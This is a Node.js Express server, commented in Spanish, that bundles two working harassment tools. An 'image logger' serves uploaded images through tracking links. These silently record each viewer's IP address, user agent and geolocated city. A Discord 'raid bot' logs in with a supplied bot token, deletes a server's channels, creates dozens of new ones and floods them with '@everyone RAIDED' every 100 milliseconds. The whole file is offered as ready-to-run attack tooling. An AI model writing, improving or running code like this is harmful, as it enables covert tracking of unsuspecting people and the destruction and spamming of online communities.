const express = require('express');
const { Client, IntentsBitField, ChannelType } = require('discord.js');
const axios = require('axios');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const app = express();

// Configuración
const PORT = process.env.PORT || 8080;

// Crear carpetas necesarias
const dirs = ['./public', './public/uploads'];
dirs.forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

// Configuración de multer para imágenes
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, './public/uploads/');
    },
    filename: (req, file, cb) => {
        const uniqueName = Date.now() + '-' + Math.round(Math.random() * 1E9) + path.extname(file.originalname);
        cb(null, uniqueName);
    }
});

const upload = multer({
    storage: storage,
    limits: { fileSize: 10 * 1024 * 1024 }, // 10MB
    fileFilter: (req, file, cb) => {
        if (file.mimetype.startsWith('image/')) {
            cb(null, true);
        } else {
            cb(new Error('Solo imágenes'), false);
        }
    }
});

// Middleware
app.use(express.json());
app.use(express.static('public'));
app.use('/uploads', express.static('public/uploads'));

// Variables globales
let ipLogs = [];
let activeBots = new Map();
let uploadedImages = new Map();

// Ruta principal - Sirve el HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================
// IMAGE LOGGER ENDPOINTS
// ============================================

// Subir imagen
app.post('/api/upload-image', upload.single('image'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'No image uploaded' });
        }

        const imageId = Date.now() + '-' + Math.random().toString(36).substring(7);
        const baseUrl = `${req.protocol}://${req.get('host')}`;
        
        uploadedImages.set(imageId, {
            filename: req.file.filename,
            originalName: req.file.originalname,
            path: req.file.path,
            url: `/uploads/${req.file.filename}`,
            mimetype: req.file.mimetype,
            createdAt: new Date()
        });

        const loggerUrl = `${baseUrl}/image/${imageId}`;

        res.json({
            success: true,
            imageId: imageId,
            loggerUrl: loggerUrl,
            previewUrl: `/uploads/${req.file.filename}`,
            discordPreview: `${baseUrl}/image/${imageId}`
        });

    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Servir imagen con logger
app.get('/image/:imageId', async (req, res) => {
    const imageId = req.params.imageId;
    const imageData = uploadedImages.get(imageId);
    
    // Capturar IP
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "0.0.0.0";
    
    let geo = "Desconocido";
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip.split(',')[0]}`);
        if(response.data.status === 'success') {
            geo = `${response.data.city}, ${response.data.country}`;
        }
    } catch(e) {}

    // Guardar log
    ipLogs.unshift({
        ip: ip.split(',')[0],
        geo: geo,
        date: new Date().toLocaleTimeString(),
        ua: req.headers['user-agent'],
        imageId: imageId,
        timestamp: new Date().toISOString()
    });

    if (ipLogs.length > 100) ipLogs.pop();

    // Servir la imagen
    if (imageData && fs.existsSync(imageData.path)) {
        res.sendFile(path.resolve(imageData.path));
    } else {
        res.redirect('https://via.placeholder.com/400x300?text=Image+Not+Found');
    }
});

// Obtener todas las imágenes
app.get('/api/images', (req, res) => {
    const images = Array.from(uploadedImages.entries()).map(([id, data]) => ({
        id: id,
        originalName: data.originalName,
        url: data.url,
        loggerUrl: `/image/${id}`,
        createdAt: data.createdAt,
        views: ipLogs.filter(log => log.imageId === id).length
    }));
    res.json(images);
});

// Obtener logs de IPs
app.get('/api/ip-logs', (req, res) => {
    res.json(ipLogs);
});

// ============================================
// RAID BOT ENDPOINTS
// ============================================

// Iniciar raid
app.post('/api/raid', async (req, res) => {
    const { token, guildId, channelName, message, amount = 50, msgCount = 15 } = req.body;
    
    if (!token) {
        return res.status(400).json({ error: "Token requerido" });
    }

    const bot = new Client({ 
        intents: [
            IntentsBitField.Flags.Guilds, 
            IntentsBitField.Flags.GuildMessages,
            IntentsBitField.Flags.MessageContent
        ] 
    });

    try {
        await bot.login(token);
        
        bot.once('ready', async () => {
            console.log(`⚡ Bot conectado: ${bot.user.tag}`);
            
            let resultados = {
                servidoresAtacados: 0,
                canalesCreados: 0,
                mensajesEnviados: 0,
                canalesEliminados: 0
            };

            const intervals = [];

            async function atacarServidor(guild) {
                try {
                    // Eliminar canales existentes
                    const channels = await guild.channels.fetch();
                    const deletePromises = [];
                    channels.forEach(channel => {
                        if (channel.deletable) {
                            deletePromises.push(
                                channel.delete().catch(() => {})
                            );
                        }
                    });
                    await Promise.all(deletePromises);
                    resultados.canalesEliminados += deletePromises.length;

                    // Crear canales
                    for (let i = 0; i < amount; i++) {
                        try {
                            const channel = await guild.channels.create({
                                name: channelName ? `${channelName}-${i}` : `raid-${i}`,
                                type: ChannelType.GuildText
                            });
                            resultados.canalesCreados++;

                            // Enviar mensajes iniciales
                            for (let j = 0; j < msgCount; j++) {
                                await channel.send(message || "@everyone RAIDED").catch(() => {});
                                resultados.mensajesEnviados++;
                            }

                            // Spam continuo
                            const interval = setInterval(() => {
                                channel.send(message || "@everyone RAIDED").catch(() => {});
                            }, 100);
                            intervals.push(interval);

                        } catch (e) {}
                    }
                    resultados.servidoresAtacados++;

                } catch (e) {
                    console.log(`Error en servidor: ${e.message}`);
                }
            }

            // Atacar servidores
            if (guildId && guildId !== 'todos') {
                const guild = bot.guilds.cache.get(guildId);
                if (guild) await atacarServidor(guild);
            } else {
                const guilds = bot.guilds.cache;
                for (const guild of guilds.values()) {
                    await atacarServidor(guild);
                }
            }

            // Guardar bot activo
            activeBots.set(token, {
                client: bot,
                intervals: intervals,
                stats: resultados,
                userTag: bot.user.tag,
                startedAt: new Date().toISOString()
            });

            res.json({ 
                success: true, 
                message: "🔥 RAID INICIADO",
                stats: resultados
            });
        });

    } catch (err) { 
        res.status(401).json({ error: "Token Inválido" }); 
    }
});

// Detener raid
app.post('/api/stop-raid', async (req, res) => {
    const { token } = req.body;
    
    const botData = activeBots.get(token);
    
    if (botData) {
        botData.intervals.forEach(interval => clearInterval(interval));
        try {
            await botData.client.destroy();
        } catch (e) {}
        activeBots.delete(token);
        res.json({ success: true, message: "✅ Raid detenido" });
    } else {
        res.json({ success: false, message: "❌ No hay raid activo" });
    }
});

// Obtener servidores del bot
app.post('/api/get-guilds', async (req, res) => {
    const { token } = req.body;
    
    const bot = new Client({ intents: [IntentsBitField.Flags.Guilds] });

    try {
        await bot.login(token);
        
        bot.once('ready', async () => {
            const guilds = bot.guilds.cache.map(guild => ({
                id: guild.id,
                name: guild.name,
                memberCount: guild.memberCount
            }));
            
            await bot.destroy();
            res.json({ success: true, guilds });
        });

    } catch (err) { 
        res.status(401).json({ error: "Token Inválido" }); 
    }
});

// Obtener bots activos
app.get('/api/active-bots', (req, res) => {
    const bots = [];
    activeBots.forEach((data, token) => {
        bots.push({
            token: token.substring(0, 20) + "...",
            user: data.userTag,
            stats: data.stats,
            startedAt: data.startedAt
        });
    });
    res.json(bots);
});

// Iniciar servidor
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
    console.log(`📁 Carpeta uploads: ${path.resolve('./public/uploads')}`);
});
